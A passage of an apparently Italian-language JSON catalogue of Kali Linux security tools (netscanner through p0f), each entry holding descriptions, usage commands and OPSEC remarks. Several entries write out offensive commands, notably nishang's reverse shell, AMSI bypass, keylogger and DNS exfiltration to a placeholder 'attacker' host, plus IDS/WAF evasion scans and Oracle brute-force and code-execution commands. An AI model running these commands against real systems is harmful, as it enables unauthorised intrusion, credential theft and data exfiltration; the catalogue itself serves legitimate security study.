moduli.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "netscanner",
    "name": "netscanner",
    "version": "0.6.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/netscanner/",
    "desc": "Scanner di rete con interfaccia TUI per discovery host e servizi in tempo reale.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Netscanner è uno scanner di rete con interfaccia TUI (Text User Interface). Mostra host e servizi scoperti in tempo reale con visualizzazione interattiva. Combina discovery ARP, port scanning e service detection in un'unica interfaccia facile da usare.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TUI Interface:</strong> Visualizzazione interattiva.</p><p><strong>Real-time:</strong> Aggiornamento live.</p><p><strong>ARP Discovery:</strong> Host su LAN.</p><p><strong>Port Scan:</strong> Servizi per host.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia scanner\nnetscanner\n\n# Con range specifico\nnetscanner -r 192.168.1.0/24\n\n# Interfaccia specifica\nnetscanner -i eth0</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Visual Recon</strong>, discovery con UI intuitiva. Nel <strong>Learning</strong>, capire struttura rete. <strong>Quick Scan</strong> interattivo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Attivo:</strong> Genera traffico di scanning. Visibile come port scanner. Consigliato per lab e ambienti autorizzati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "netsed",
    "name": "netsed",
    "version": "1.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/netsed/",
    "desc": "Proxy per modificare traffico di rete on-the-fly con regole di sostituzione pattern.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Netsed è un proxy per modificare traffico TCP/UDP on-the-fly. Applica regole di sostituzione pattern (simili a sed) ai pacchetti che passano. Utile per testing, debugging, e attacchi MITM dove si vogliono alterare dati in transito senza interrompere la connessione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Pattern Replace:</strong> Sostituzioni regex-like.</p><p><strong>TCP/UDP:</strong> Supporto entrambi.</p><p><strong>Transparent:</strong> Proxy invisibile per endpoint.</p><p><strong>Multiple Rules:</strong> Regole concatenabili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Proxy su porta 8080, forward a 80\nnetsed tcp 8080 target.com 80 's/oldstring/newstring'\n\n# Multiple sostituzioni\nnetsed tcp 8080 target 80 's/foo/bar' 's/baz/qux'\n\n# UDP proxy\nnetsed udp 5353 target 5353 's/pattern/replace'</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Protocol Testing</strong>, modifica pacchetti al volo. Nel <strong>MITM</strong>, altera dati in transito. <strong>Debugging</strong> di applicazioni di rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>MITM position:</strong> Richiede controllo del traffico. Modifiche visibili se analizzate. Utile principalmente in lab o con accesso LAN.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "netsniff-ng",
    "name": "netsniff-ng",
    "version": "0.6.9",
    "icon": "../app/icons/netsniff-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/netsniff-ng/",
    "desc": "Toolkit di sniffing ad alte prestazioni con zero-copy per cattura e analisi pacchetti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Netsniff-ng è un toolkit di packet sniffing ad alte prestazioni per Linux. Usa tecniche zero-copy per cattura wire-speed senza perdita di pacchetti. Include tool per capture, replay, traffic generation, e analisi. Perfetto per network forensics ad alto throughput.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Zero-copy:</strong> Performance massime.</p><p><strong>Wire-speed:</strong> Cattura 10Gbps+.</p><p><strong>Multiple Tools:</strong> trafgen, flowtop, etc.</p><p><strong>PCAP Compatible:</strong> Output standard.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cattura traffico\nnetsniff-ng -i eth0 -o capture.pcap\n\n# Con filtro BPF\nnetsniff-ng -i eth0 -f 'tcp port 80' -o http.pcap\n\n# Replay traffico\ntrafgen -i eth0 -c traffic.cfg\n\n# Monitor connessioni\nflowtop</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>High-speed Capture</strong>, network forensics su reti veloci. Nel <strong>Traffic Analysis</strong>, cattura senza perdite. <strong>Traffic Generation</strong> per testing.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passivo:</strong> Solo cattura, non inietta (tranne trafgen). Richiede promiscuous mode. File di cattura possono essere enormi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "nextnet",
    "name": "nextnet",
    "version": "0.0.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nextnet/",
    "desc": "Tool per identificare subnet raggiungibili da un host tramite pivot point analysis.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Nextnet identifica subnet raggiungibili da un host compromesso. Analizza routing table, interfacce, e fa probing per scoprire reti a cui l'host ha accesso. Essenziale per pianificare pivoting e lateral movement durante post-exploitation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Route Analysis:</strong> Analizza routing table.</p><p><strong>Interface Enum:</strong> Lista tutte le interfacce.</p><p><strong>Subnet Discovery:</strong> Identifica reti raggiungibili.</p><p><strong>Pivot Planning:</strong> Suggerisce percorsi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analizza host corrente\nnextnet\n\n# Output dettagliato\nnextnet -v\n\n# Da routing table specifica\nnextnet -r routes.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Pivot Planning</strong>, identifica dove pivotare. Nel <strong>Post-exploitation</strong>, mappa reti raggiungibili. <strong>Red Team</strong> per espansione del foothold.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Locale:</strong> Principalmente analisi di configurazione locale. Probe attivi possono generare traffico. Eseguire su host compromesso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "nikto",
    "name": "nikto",
    "version": "2.5.0",
    "icon": "../app/icons/nikto-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nikto/",
    "desc": "Scanner web classico per vulnerabilità, misconfig server, file sensibili e CGI exploit.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Nikto è uno scanner web classico per vulnerabilità server. Testa migliaia di problemi: file sensibili, versioni software vulnerabili, misconfigurazione, CGI problems, e altro. Aggiornato regolarmente con nuove vulnerabilità. Tool fondamentale per web assessment.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>6700+ Tests:</strong> Ampio database di check.</p><p><strong>Version Detection:</strong> Identifica software e versioni.</p><p><strong>File Discovery:</strong> Trova file sensibili.</p><p><strong>Multiple Formats:</strong> Output HTML, XML, CSV.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan completo con SSL e output multi-formato\nnikto -h https://target.com -ssl -o report.html -Format html,csv,xml\n\n# Scan porte multiple contemporaneamente\nnikto -h target.com -p 80,443,8080,8443\n\n# Tuning granulare per test specifici\n# 1=Files, 2=Misconfig, 3=Info, 4=XSS, 5=Inj, 6=RFI, 7=Cmd, 8=SQLi, 9=DoS\nnikto -h target.com -Tuning 1234567890abc -Cgidirs all\n\n# Evasion WAF completa + randomizzazione\nnikto -h target.com -evasion 1234567 -useragent \"Mozilla/5.0\" -Pause 2\n\n# Autenticazione Basic/Digest\nnikto -h target.com -id admin:password\n\n# Scan con virtual host specifico\nnikto -h 192.168.1.10 -vhost internal.target.com\n\n# Pipeline: nmap -&gt; nikto su porte web trovate\nnmap -sV target.com -p- | grep http | awk '{print $1}' | \\\n  cut -d'/' -f1 | xargs -I{} nikto -h target.com -p {}\n\n# Scan con proxy (Burp) per analisi\nnikto -h target.com -useproxy http://127.0.0.1:8080</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Assessment</strong>, scan iniziale di vulnerabilità. Nel <strong>Compliance</strong>, verifica configurazioni. <strong>Pentesting</strong> fase di discovery.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumoroso:</strong> Migliaia di request. User-agent identificabile. Facilmente rilevato da WAF/IDS. Evasion mode può aiutare.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "nipper-ng",
    "name": "nipper-ng",
    "version": "0.11.10",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nipper-ng/",
    "desc": "Analizzatore di configurazione per dispositivi di rete: Cisco, Juniper, firewall.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Nipper-ng analizza file di configurazione di dispositivi di rete. Supporta Cisco IOS/PIX/ASA, Juniper, CheckPoint, e altri. Identifica vulnerabilità, misconfiguration, password deboli, e non conformità a best practice. Genera report dettagliati con raccomandazioni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-vendor:</strong> Cisco, Juniper, CheckPoint, etc.</p><p><strong>Security Audit:</strong> Identifica vulnerabilità.</p><p><strong>Best Practice:</strong> Verifica conformità.</p><p><strong>Reports:</strong> Output dettagliato HTML/XML.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analizza config Cisco\nnipper-ng --ios-router running-config.txt\n\n# Firewall PIX/ASA\nnipper-ng --pix config.txt\n\n# Output HTML\nnipper-ng --ios-router config.txt --html > report.html</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Config Audit</strong>, review di configurazioni network. Nel <strong>Compliance</strong>, verifica policy di sicurezza. <strong>Penetration Testing</strong> analisi post-accesso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Offline:</strong> Analisi di file di configurazione. Nessun traffico di rete. File config contengono info sensibili - proteggere.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "nishang",
    "name": "nishang",
    "version": "0.7.6",
    "icon": "../app/icons/nishang-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nishang/",
    "desc": "Framework PowerShell per pentesting: shell, bypass, privilege escalation e exfiltration.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Nishang è un framework PowerShell per pentesting e red teaming. Include script per shell (bind, reverse, HTTP), bypass di security controls, privilege escalation, data exfiltration, backdoor, e keylogging. Tutto nativo PowerShell per operare su Windows senza binary esterni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Shells:</strong> TCP, UDP, HTTP, ICMP reverse.</p><p><strong>Bypass:</strong> AMSI, AppLocker, UAC.</p><p><strong>Escalation:</strong> Token manipulation, DLL injection.</p><p><strong>Exfil:</strong> DNS, HTTP, Gmail, Pastebin.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Reverse shell TCP\nInvoke-PowerShellTcp -Reverse -IPAddress attacker -Port 4444\n\n# HTTP shell\nInvoke-PowerShellTcpOneLine -IPAddress attacker -Port 80\n\n# Bypass AMSI\nInvoke-AmsiBypass\n\n# Keylogger\nStart-KeyLogger\n\n# Exfiltration via DNS\nDo-Exfiltration -Type DNS -Data \"secret\" -DNSServer attacker</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, operazioni Windows PowerShell-only. Nel <strong>Pentesting</strong>, post-exploitation nativa. <strong>Bypass</strong> di controlli security.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevabile:</strong> Script noti a AV/EDR. PowerShell logging attivo in enterprise. AMSI può bloccare. Offuscazione necessaria.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "nmap-kali",
    "name": "nmap",
    "version": "7.95",
    "icon": "../app/icons/nmap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nmap/",
    "desc": "Lo scanner di rete più usato al mondo: discovery, port scan, OS/service detection, NSE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Nmap (Network Mapper) è LO scanner di rete più utilizzato al mondo. Esegue host discovery, port scanning, OS detection, service/version detection, e vulnerability scanning via NSE (Nmap Scripting Engine). Strumento fondamentale per ogni security professional.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Port Scanning:</strong> TCP SYN/Connect, UDP, etc.</p><p><strong>OS Detection:</strong> Fingerprinting del sistema operativo.</p><p><strong>Service Detection:</strong> Versioni software.</p><p><strong>NSE:</strong> 600+ script per vulnerability detection.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SCANNING BASE ===\nnmap target.com                     # Top 1000 porte\nnmap -sS -sV -p- target.com         # Full TCP con versioni\nnmap -sU --top-ports 100 target     # UDP top 100\n\n# === AGGRESSIVE RECON ===\nnmap -A -T4 -p- target.com          # OS, version, scripts, traceroute\nnmap -sC -sV -O target.com          # Default scripts + version + OS\n\n# === STEALTH / EVASION ===\n# Frammentazione pacchetti\nnmap -f -sS target.com\n# Decoy (nasconde tra IP fake)\nnmap -D RND:10 target.com\n# Source port spoofing (simula DNS/HTTP)\nnmap --source-port 53 -sS target.com\nnmap --source-port 80 -sS target.com\n# Slow scan (evita IDS threshold)\nnmap -T1 -sS --max-rate 10 target.com\n# Idle scan (truly anonymous via zombie)\nnmap -sI zombie_ip target.com\n\n# === NSE VULNERABILITY SCANNING ===\n# Tutti gli script vuln\nnmap --script vuln target.com\n# SMB vulnerabilità (EternalBlue, etc)\nnmap --script smb-vuln* -p445 target\n# SSL/TLS issues\nnmap --script ssl* -p443 target\n# Script specifici con args\nnmap --script http-sql-injection --script-args http-sql-injection.url=\"/search?q=test\" target\n\n# === SERVICE-SPECIFIC ENUM ===\n# SMB enumeration\nnmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p445 target\n# HTTP enumeration\nnmap --script http-enum,http-headers,http-methods,http-title -p80,443,8080 target\n# LDAP/AD\nnmap --script ldap-rootdse,ldap-search -p389,636 target\n\n# === OUTPUT FORMATS ===\nnmap -oA scan_all target        # Tutti i formati\nnmap -oX scan.xml target        # XML per parsing\nnmap -oG scan.grep target       # Grepable\nnmap --stylesheet scan.xsl -oX report.xml target  # HTML report\n\n# === PIPELINE AUTOMATION ===\n# Scan range, estrai IP attivi, scan profondo\nnmap -sn 192.168.1.0/24 -oG - | grep \"Up\" | awk '{print $2}' > alive.txt\nnmap -sS -sV -p- -iL alive.txt -oA detailed_scan\n\n# === NMAP + NSE EXPLOITATION ===\n# FTP anonymous + vuln check\nnmap --script ftp-anon,ftp-vuln* -p21 target\n# RCE check su servizi noti\nnmap --script http-vuln-cve2017-5638 -p80,8080 target  # Struts\nnmap --script rdp-vuln-ms12-020 -p3389 target          # BlueKeep\n\n# === PERFORMANCE TUNING ===\nnmap -T4 --min-rate 1000 --max-retries 2 -p- target     # Fast\nnmap --host-timeout 30m --max-scan-delay 1s target      # Reliable</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Recon</strong>, discovery e enumeration di qualsiasi rete. Nel <strong>Pentesting</strong>, base di ogni assessment. <strong>Vulnerability Scanning</strong> con NSE scripts. <strong>Stealth Recon</strong> con tecniche di evasion.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevabile:</strong> Scan SYN visibili a IDS/firewall. Usa -T1 o --max-rate per stealth. Decoy (-D) e fragmentazione (-f) per evasion. Idle scan (-sI) per anonimato totale. NSE scripts generano traffico specifico identificabile.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "odat",
    "name": "odat",
    "version": "5.1.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/odat/",
    "desc": "Oracle Database Attacking Tool: enumeration, privilege escalation, code execution su DB Oracle.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>ODAT (Oracle Database Attacking Tool) è un toolkit per pentesting di database Oracle. Include moduli per enumeration, password brute force, privilege escalation, code execution via Java/PL-SQL, e upload/download file. Completo per assessment di infrastrutture Oracle.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SID Guess:</strong> Enumera SID del database.</p><p><strong>Password Attack:</strong> Brute force credenziali.</p><p><strong>Privilege Escalation:</strong> Da user a DBA.</p><p><strong>Code Execution:</strong> Java, External Table, etc.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># SID enumeration\nodat sidguesser -s target.com\n\n# Password brute force\nodat passwordguesser -s target.com -d SID -U users.txt -P pass.txt\n\n# Upload file via DBMS_XSLPROCESSOR\nodat dbmsxslprocessor -s target -d SID -U user -P pass --putFile /tmp/ file.txt local.txt\n\n# Java code execution\nodat java -s target -d SID -U user -P pass --exec 'whoami'</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Oracle Pentesting</strong>, assessment completo. Nel <strong>Database Security</strong>, test di configurazione. <strong>Privilege Escalation</strong> in Oracle.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Loggabile:</strong> Azioni database loggabili in audit. Brute force genera alert. Code execution molto visibile.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Database"
    ],
    "notes": null
  },
  {
    "id": "ollydbg",
    "name": "ollydbg",
    "version": "1.10",
    "icon": "../app/icons/ollydbg-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ollydbg/",
    "desc": "Debugger x86 per Windows, usato per analisi malware e reverse engineering di binari PE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>OllyDbg è un debugger x86 per Windows rinomato per la sua facilità d'uso. Usato per reverse engineering di binari PE, analisi malware, crack di protezioni software. Include disassembler, analisi di import/export, patching in memoria. Predecessore di x64dbg.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Debugger:</strong> Step, breakpoint, watch.</p><p><strong>Disassembler:</strong> Visualizza codice assembly.</p><p><strong>Analysis:</strong> Import, export, strings.</p><p><strong>Patching:</strong> Modifica byte in memoria.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Esegui su Windows con Wine\nwine ollydbg.exe\n\n# Carica eseguibile\nFile -> Open -> seleziona PE\n\n# Operazioni comuni:\n# F2 - Set breakpoint\n# F7 - Step into\n# F8 - Step over\n# F9 - Run</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Malware Analysis</strong>, analisi dinamica di sample. Nel <strong>Reverse Engineering</strong>, capire funzionamento software. <strong>Exploit Development</strong> per debug di shellcode.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Locale:</strong> Analisi su sistema isolato. Malware può rilevare debugger. VM consigliata. Solo x86 (usa x64dbg per 64-bit).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "onesixtyone",
    "name": "onesixtyone",
    "version": "0.3.4",
    "icon": "../app/icons/onesixtyone-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/onesixtyone/",
    "desc": "Scanner SNMP veloce per brute force community string e discovery dispositivi di rete.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Onesixtyone è uno scanner SNMP veloce per brute force di community string. Invia richieste SNMP UDP a multipli host in parallelo, testando liste di community string comuni. Trova dispositivi con SNMP public, private, o community deboli.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fast:</strong> Scan paralleli UDP.</p><p><strong>Brute Force:</strong> Lista di community string.</p><p><strong>Bulk Scan:</strong> Multipli host simultanei.</p><p><strong>Simple Output:</strong> IP e community trovata.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan con community default\nonesixtyone 192.168.1.0/24 public\n\n# Con file di community\nonesixtyone -c communities.txt 192.168.1.0/24\n\n# Da file di host\nonesixtyone -c communities.txt -i hosts.txt\n\n# Output:\n# 192.168.1.1 [public]\n# 192.168.1.5 [private]</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Discovery</strong>, trova dispositivi SNMP. Nel <strong>Pentesting</strong>, identifica community deboli. <strong>Asset Inventory</strong> via SNMP.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Moderato:</strong> Traffic UDP 161. Può essere loggato da SIEM. Pattern riconoscibile. Community string in chiaro.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SNMP"
    ],
    "notes": null
  },
  {
    "id": "ophcrack",
    "name": "ophcrack",
    "version": "3.8.0",
    "icon": "../app/icons/ophcrack-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ophcrack/",
    "desc": "Cracker password Windows via rainbow tables LM/NTLM con interfaccia grafica.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ophcrack</strong> è un cracker di password Windows che utilizza rainbow tables precompilate per recuperare password LM e NTLM in tempi molto rapidi. Fornisce interfaccia grafica intuitiva e supporta boot da Live CD per accesso offline ai sistemi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Rainbow Tables:</strong> utilizza tabelle precompilate per crack veloce senza brute-force tradizionale</p><p><strong>GUI Intuitiva:</strong> interfaccia grafica per visualizzare progresso e risultati in tempo reale</p><p><strong>Live CD:</strong> disponibile come sistema bootable per crack offline senza accesso al sistema</p><p><strong>Multi-hash:</strong> supporta LM, NTLM e combinazioni per compatibilità con tutte le versioni Windows</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio interfaccia grafica\nophcrack\n\n# Caricamento SAM da sistema locale\nophcrack -d /path/to/tables -t /path/to/SAM\n\n# Utilizzo tabelle specifiche\nophcrack -d /path/to/tables -n 4</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>password recovery</strong>, recupero credenziali su sistemi Windows bloccati. Per <strong>forensics</strong>, accesso a sistemi durante investigazioni autorizzate. Per <strong>audit</strong>, verifica robustezza password aziendali contro rainbow table attacks.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Dimensione:</strong> rainbow tables richiedono GB di spazio disco. <strong>Detection:</strong> boot da Live CD evita log sul sistema target. <strong>Limitazioni:</strong> password lunghe e complesse resistono alle rainbow tables standard.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "oscanner",
    "name": "oscanner",
    "version": "1.0.6",
    "icon": "../app/icons/oscanner-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/oscanner/",
    "desc": "Scanner per database Oracle: enumeration SID, account, privilegi e vulnerabilità note.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>OScanner</strong> è uno scanner Java per database Oracle che esegue enumeration completa di SID, account utente, privilegi, ruoli e identifica vulnerabilità note e misconfigurazioni. Strumento essenziale per pentest su infrastrutture Oracle.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SID Enumeration:</strong> discovery di Service Identifiers attraverso tecniche multiple</p><p><strong>Account Testing:</strong> verifica credenziali di default e weak password su account Oracle</p><p><strong>Privilege Mapping:</strong> mappa privilegi e ruoli assegnati agli utenti identificati</p><p><strong>Vuln Detection:</strong> identifica vulnerabilità note e patch mancanti sul database</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan base di un host Oracle\noscanner -s target_ip\n\n# Scan con porta specifica\noscanner -s target_ip -P 1521\n\n# Enumeration con wordlist custom\noscanner -s target_ip -f sid_wordlist.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>database pentesting</strong>, enumeration completa di istanze Oracle aziendali. Per <strong>compliance audit</strong>, verifica configurazioni sicure e account di default rimossi. Per <strong>vulnerability assessment</strong>, identificazione patch mancanti e misconfigurazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumore:</strong> scan intensivi generano log sul database. <strong>Lockout:</strong> troppi tentativi di login possono bloccare account. <strong>Detection:</strong> query anomale facilmente rilevabili da DBA.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "Database"
    ],
    "notes": null
  },
  {
    "id": "osrframework",
    "name": "osrframework",
    "version": "0.20.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/osrframework/",
    "desc": "Suite OSINT per ricerca username, email, domini su centinaia di piattaforme online.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>OSRFramework</strong> è una suite completa di strumenti OSINT che permette di cercare username, email e altre informazioni su centinaia di piattaforme online. Include moduli specializzati come usufy per username lookup, mailfy per email verification e domainfy per ricerche su domini.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Usufy:</strong> ricerca username su oltre 300 piattaforme social e servizi online</p><p><strong>Mailfy:</strong> verifica esistenza email e trova account associati</p><p><strong>Domainfy:</strong> ricerca domini registrati con pattern specifici</p><p><strong>Searchfy:</strong> aggregazione risultati da motori di ricerca multipli</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Ricerca username su tutte le piattaforme\nusufy -n target_username\n\n# Verifica email\nmailfy -n target@email.com\n\n# Ricerca domini con pattern\ndomainfy -n target_company -t all\n\n# Ricerca telefono\nphonefy -n +39123456789</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT investigations</strong>, profiling completo di target attraverso presenza online. Per <strong>social engineering prep</strong>, raccolta informazioni per campagne di phishing. Per <strong>brand monitoring</strong>, identificazione account fake o impersonation.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rate limiting:</strong> query massive possono triggerare blocchi su piattaforme. <strong>Attribution:</strong> alcune query richiedono VPN/Tor per anonimato. <strong>API keys:</strong> moduli avanzati richiedono API key per funzionalità complete.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "People_Search"
    ],
    "notes": null
  },
  {
    "id": "owl",
    "name": "owl",
    "version": "0~git20220130",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/owl/",
    "desc": "File integrity monitoring tool per rilevare modifiche sospette su filesystem.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>OWL</strong> è un tool di file integrity monitoring che monitora modifiche sospette al filesystem. Utilizza inotify per rilevamento in tempo reale e mantiene database di hash per verificare integrità dei file. Utile per forensics e incident response.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Real-time Monitoring:</strong> usa inotify per rilevare modifiche istantaneamente</p><p><strong>Hash Database:</strong> mantiene baseline di hash per confronti di integrità</p><p><strong>Change Tracking:</strong> registra creazione, modifica, eliminazione e accesso ai file</p><p><strong>Alerting:</strong> notifiche configurabili per eventi sospetti</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Inizializzazione database su directory\nowl init /path/to/monitor\n\n# Avvio monitoraggio real-time\nowl watch /path/to/monitor\n\n# Verifica integrità contro baseline\nowl check /path/to/monitor\n\n# Report delle modifiche rilevate\nowl report</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>incident response</strong>, identificazione file modificati durante compromissione. Per <strong>forensics</strong>, timeline di modifiche filesystem durante analisi. Per <strong>compliance</strong>, monitoraggio integrità file critici di sistema.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Performance:</strong> monitoraggio intensivo può impattare sistemi con molti file. <strong>Storage:</strong> database hash richiede spazio proporzionale ai file monitorati. <strong>Evasione:</strong> attaccanti sofisticati possono manipolare il tool stesso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "p0f",
    "name": "p0f",
    "version": "3.09b",
    "icon": "../app/icons/p0f-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/p0f/",
